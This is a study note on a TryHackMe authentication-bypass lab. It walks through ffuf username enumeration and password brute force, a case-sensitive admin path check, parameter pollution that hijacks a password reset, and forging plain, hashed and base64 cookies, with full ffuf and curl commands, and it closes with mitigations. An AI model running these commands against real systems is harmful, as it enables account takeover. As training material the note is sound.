# Authentication Bypass

Reaching functionality that belongs to an account **without supplying that account's real credential**. You don't always steal a password or a session token — often you just exploit an assumption the developer made, or edit a value the server trusts without checking.

> This is the **TryHackMe "Authentication Bypass" room** (Jr. Penetration Tester → Authentication). It covers the four techniques that show up over and over in real testing: **username enumeration**, **credential brute force**, **logic flaws** in account recovery, and **cookie manipulation** — each against the Acme IT Support app, plus mitigations.
>
> 🔗 Related notes: [Session Management](./Session-Management.md) (this is the attack side of session creation/tracking), [IDOR](../../Vulnerabilities/IDOR/IDOR.md) (cookie tampering to change *who the server thinks you are* is the authorisation cousin of IDOR).

---

**Table of contents**

- [In plain English](#in-plain-english)
- [What an authentication bypass is](#what-an-authentication-bypass-is)
- [Impact](#impact)
- [1. Username enumeration](#1-username-enumeration)
- [2. Credential brute force](#2-credential-brute-force)
- [3. Logic flaws](#3-logic-flaws)
  - [Case-sensitive path comparison](#case-sensitive-path-comparison)
  - [Parameter pollution in password reset](#parameter-pollution-in-password-reset)
- [4. Cookie manipulation](#4-cookie-manipulation)
  - [Plain text cookies](#plain-text-cookies)
  - [Hashed cookies](#hashed-cookies)
  - [Encoded cookies](#encoded-cookies)
- [Mitigations](#mitigations)
- [Key takeaways](#key-takeaways)

---

## In plain English

Logging in is really the server asking two questions: *does this account exist?* and *did you prove you own it?* A bypass wins by attacking the gaps around those questions instead of answering them honestly.

| Technique | The trick in one line | What it needs |
| --- | --- | --- |
| **Username enumeration** | The form replies *differently* for real vs fake accounts, so you can harvest the real ones | A signup/login/reset form that leaks "already exists" |
| **Brute force** | Try your short username list × a password list until one pair works | No rate limiting / lockout |
| **Logic flaw** | Feed valid-looking input that pushes the workflow down an unintended path | Two parts of the app disagreeing about the same input |
| **Cookie manipulation** | Edit the cookie that says "I'm logged in / I'm admin" — the server believes it | Cookies that aren't signed |

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>Jargon, quickly:</strong> <strong>Authentication</strong> = proving who you are (usually a password). <strong>Session token / cookie</strong> = the value the server hands back after login and trusts on later requests. <strong>Enumeration</strong> = discovering which usernames really exist. <strong>Brute force</strong> = trying many credential guesses automatically. <strong>ffuf</strong> = a fast fuzzer that swaps wordlist entries into a request and filters the responses. <strong>Wordlist / SecLists</strong> = a file of candidate values (names, passwords); SecLists is the standard collection. <strong>Logic flaw</strong> = a bug from valid input driving an unintended sequence, not from malformed input. <strong>Parameter pollution</strong> = the same parameter name supplied in two places, and the server picking the wrong one. <strong>Signed cookie</strong> = a cookie with a cryptographic tag so tampering is detectable; <strong>hash</strong> = a one-way fingerprint of a value (not a signature). <strong>Credential stuffing</strong> = reusing a leaked password against other sites.
</div>

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>How to use these notes:</strong> a lookup sheet, not rote memorisation. The chain is the point — enumeration produces the short username list that makes brute force feasible, so these four aren't isolated tricks; they feed each other.
</div>

---

## What an authentication bypass is

Normal flow: the app server compares submitted credentials against a **credential store**; on a match it issues a **session token** returned on every later request, and uses that token to decide what the request may do.

A **bypass** reaches restricted functionality **without the correct credential**. It succeeds by exploiting the developer's assumptions about how the auth process would be used, or by modifying data the server trusts without independent verification. Four techniques dominate real-world testing, each hitting a different part of the auth stack.

---

## Impact

- **Reach one user's data/functionality** — a customer account exposes personal info, transaction history, records; an **admin** account gives control of the app itself (edit other users, read the database, change config).
- **First step in a longer attack** — a support-agent session reads every customer's tickets; an admin account can sometimes lead to **code execution** via features like file upload or script evaluation.
- **Credential reuse / stuffing** — a password recovered on one site is replayed against unrelated services, since users reuse passwords. Accounts for a large share of consumer account compromise.

---

## 1. Username enumeration

Goal: turn "I don't know any accounts" into a short list of **real** usernames, which then feeds brute force, password spraying, and targeted phishing.

**Where it leaks:** anywhere the app treats registered and unregistered values differently — a signup form that rejects duplicates, a login form that separates "unknown account" from "bad password", a reset form that says whether an email is on file.

**Error message differentials.** The classic vector: a signup form returns *"An account with this username already exists"* for a taken name and a success message for a new one. Even if the visible text is identical, responses can still differ in **length, status code, response time, or redirect** — so a form is enumerable if *any* of those diverge.

On Acme, `POST /customers/signup` with `username=admin` (junk in the other fields) returns the "already exists" message; an unregistered name returns a different body. That difference is the signal.

**Enumerate with ffuf** (fast Go fuzzer; `FUZZ` marks where each wordlist entry goes):

```bash
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt \
  -X POST \
  -d "username=FUZZ&email=x&password=x&cpassword=x" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -u http://MACHINE_IP/customers/signup \
  -mr "username already exists"
```

| Flag | Meaning |
| --- | --- |
| `-w` | wordlist of candidate usernames |
| `-X POST` | HTTP method the form uses |
| `-d "…FUZZ…"` | request body; `FUZZ` is replaced by each word |
| `-H` | set `Content-Type` so the body is treated as form data |
| `-u` | target URL |
| `-mr "…"` | **match regex** — only show responses whose body contains this string |

Save the hits to `valid_usernames.txt`, **one per line, no status codes / timing columns / whitespace** — the file is passed straight into ffuf next.

## 2. Credential brute force

Pair the enumerated usernames with a password dictionary and submit every combination until one authenticates. Feasibility is all about list size: 5 users × 100 passwords = 500 attempts (seconds); 10,000 × 100 = a million attempts (slow, likely to trip lockouts). **This is why enumeration comes first** — it produces the short, high-quality list.

**Success condition** must be identified per app. Acme's `POST /customers/login` returns **HTTP 200** (login page re-rendered) on failure and a **302 redirect** to the dashboard on success — so the status-code change is the signal. Other apps signal success with a new body, an extra cookie, or a specific redirect URL.

**Two wordlists in ffuf** (custom markers instead of `FUZZ`):

```bash
ffuf \
  -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 \
  -X POST \
  -d "username=W1&password=W2" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -u http://MACHINE_IP/customers/login \
  -fc 200
```

- `W1` = username list, `W2` = top-100 passwords; each username is paired with every password.
- `-fc 200` = **filter code** — discard every HTTP 200 (the failures), leaving only the successful 302 login visible.

## 3. Logic flaws

A logic flaw redirects the app's intended flow using **valid** input the developer didn't anticipate. No malformed data, no injection — you reach a privileged state by exploiting an **inconsistency between two rules** each designed in isolation. Scanners rarely find these because they depend on the app's business rules; finding them means reading code/docs or testing each workflow by hand.

### Case-sensitive path comparison

Two components disagree about how to interpret input:

```javascript
if( url.substr(0,6) === '/admin') {
    // check user is an admin
} else {
    // view page
}
```

`===` is a strict comparison, so `/admin` enters the privileged branch but `/adMin` does **not** — the admin check is skipped. If the **router underneath is case-insensitive** and maps `/adMin` to the same handler, the request reaches the admin page **with no privilege check**. Neither piece is wrong alone — case-insensitive routing is reasonable, strict comparison is reasonable; the flaw is the **disagreement**.

### Parameter pollution in password reset

Acme's `POST /customers/reset` is a two-step workflow: step one takes an email; step two takes the username and emails a reset link **to the address on file**. It looks well-defended — both values required, link goes to the account's real email. But the two values live in **different parts of the request**: the **email is in the query string**, the **username is in the POST body**.

Legitimate step-two request (`%40` is the URL-encoded `@`):

```bash
curl 'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'username=robert'
```

**The bug:** the server identifies the account from the **query-string** `email`, but builds the outgoing message using PHP's **`$_REQUEST`**, which merges query string + POST body + cookies into one array — and when a key appears in more than one source, **the POST body wins by default**. So adding a second `email` in the body silently overrides the query-string value, and the reset link goes to an attacker-chosen address:

```bash
curl 'http://MACHINE_IP/customers/reset?email=robert%40acmeitsupport.thm' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'username=robert&email=attacker@hacker.com'
```

The identity check reads one source; the email side-effect reads another — any input that influences either can **desynchronise the two** and redirect the reset link.

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>Completing the room's task (no flag reproduced here):</strong> Acme gives every registered customer an internal inbox <code>{username}@customer.acmeitsupport.thm</code>, and mail to it shows up as a support ticket on that account. Register a customer, then run the exploit with <em>your own</em> assigned address as the second <code>email</code>. The reset link lands as a ticket on your account; following it authenticates the browser as Robert, and his tickets hold the task flag.
</div>

## 4. Cookie manipulation

HTTP is stateless, so apps use cookies to remember you're authenticated. If the cookie carries session state and **isn't cryptographically signed**, the client can edit it and change the server's decision. Three vulnerable formats:

### Plain text cookies

State stored directly and editably:

```http
Set-Cookie: logged_in=true; Max-Age=3600; Path=/
Set-Cookie: admin=false;    Max-Age=3600; Path=/
```

No signature → the server can't detect edits. Against Acme's `/cookie-test`:

```bash
curl http://MACHINE_IP/cookie-test                                  # Not Logged In
curl -H "Cookie: logged_in=true; admin=false" http://MACHINE_IP/cookie-test   # Logged In As A User
curl -H "Cookie: logged_in=true; admin=true"  http://MACHINE_IP/cookie-test   # Logged In As An Admin (+flag)
```

### Hashed cookies

A hash is a one-way, fixed-length fingerprint — same input → same output, and it can't be inverted. Developers sometimes hash a cookie value thinking that makes it tamper-resistant. **It doesn't:** a hash is *content-addressable*, not a signature. Anyone who knows or guesses the original value produces the same hash and substitutes it.

| String | MD5 | SHA-1 | SHA-256 |
| --- | --- | --- | --- |
| `1` | `c4ca4238a0b923820dcc509a6f75849b` | `356a192b7913b04c54574d18c28d46e6395428ab` | `6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b` |

Irreversibility only stops brute-force *recovery* of the original. For short/predictable inputs, **precomputed tables** ([CrackStation](https://crackstation.net), billions of hash→value pairs) make the hash effectively reversible with a lookup. Identify the algorithm by output length: 32 hex = MD5, 40 = SHA-1, 64 = SHA-256, 128 = SHA-512.

### Encoded cookies

Encoding is a **reversible** transform to fit data into an allowed character set — **no confidentiality, no integrity**. `base32` uses `A-Z 2-7`; `base64` uses `a-z A-Z 0-9 + /` with `=` padding. Developers base64 a JSON session blob to fit cookie syntax:

```http
Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/
```

Decode → `{"id":1,"admin":false}`. Edit to `"admin":true`, re-encode, substitute. Because the server never validates or signs the payload, the modified cookie is accepted:

```bash
echo 'eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==' | base64 -d      # {"id":1,"admin":false}
echo -n '{"id":1,"admin":true}' | base64                  # forge the new cookie value
```

<div style="background:#fff7ed;border-left:4px solid #f59e0b;padding:12px;border-radius:6px;margin:8px 0">
<strong>The common thread:</strong> plain / hashed / encoded cookies all fail the same way — the server trusts the cookie's <em>contents</em> without proving it <em>issued</em> them unchanged. Only a signature (HMAC/JWT) or an opaque server-side session ID fixes that. Hashing and encoding are obfuscation, not integrity.
</div>

---

## Mitigations

| Attack | Fix |
| --- | --- |
| **Username enumeration** | Return **indistinguishable** responses (body, status code, timing) for registered vs unregistered on signup/login/reset. E.g. accept any signup and email a confirmation either way. Rate limiting + CAPTCHA slow (not close) the leak. |
| **Brute force** | Rate limiting + account lockout (tuned to avoid DoS of real users). **MFA** is the strongest single control — a guessed password alone isn't enough. Prefer **long passphrases** over short-complex-frequently-rotated passwords. |
| **Logic flaws** | Every security decision reads its inputs from **one trusted source**. Reset should email the address in the **database** for the target account, not a value re-read from the request. Avoid input-merging features in security code paths — in PHP prefer explicit `$_GET` / `$_POST` / `$_COOKIE` over `$_REQUEST`. |
| **Cookie tampering** | **Sign** tokens (HMAC / signed JWT) so any edit invalidates them, **or** issue an **opaque session ID** and keep state server-side (Redis/DB) so there's nothing to tamper with. Hashing is **not** a substitute — it proves the client saw a value, not that the server issued it unchanged. |

---

## Key takeaways

- **Authentication bypass = reaching an account's functionality without its real credential** — by abusing developer assumptions or editing trusted data.
- **Four techniques, and they chain:** enumeration → a short username list → brute force; logic flaws and cookie edits stand alone but reach the same goal.
- **Enumeration** exploits *different* responses for real vs fake accounts (text, length, code, timing, redirect). `ffuf … -mr "already exists"`.
- **Brute force** needs a known success signal (Acme: 302 vs 200) and no rate limiting. `ffuf -w users:W1,pwlist:W2 … -fc 200`.
- **Logic flaws** come from two components disagreeing about the same input — case-insensitive routing vs strict `===`, or `$_REQUEST` merging so a **body** `email` overrides the **query-string** `email` in a password reset (**parameter pollution**).
- **Cookie manipulation:** unsigned plain-text, hashed, or base64 cookies can be edited to flip `admin=false`→`true`. Hashing and encoding add **no integrity** — only signing or server-side sessions do.
- **Defences:** identical responses, rate limit + lockout + MFA + passphrases, single-source inputs in security code, and signed/opaque session tokens.

<div style="background:#eef8ff;border-left:4px solid #2b8cf0;padding:12px;border-radius:6px;margin:8px 0">
<strong>How this sits vs the neighbours:</strong> <a href="./Session-Management.md">Session Management</a> is the defender's view of the whole lifecycle — this room is the attacker walking into its weakest doors (weak/forgeable session values = cookie manipulation; excessive trust in client data = logic flaws). Cookie tampering to change <em>who the server thinks you are</em> is the authentication-layer cousin of the authorisation-layer <a href="../../Vulnerabilities/IDOR/IDOR.md">IDOR</a>.
</div>
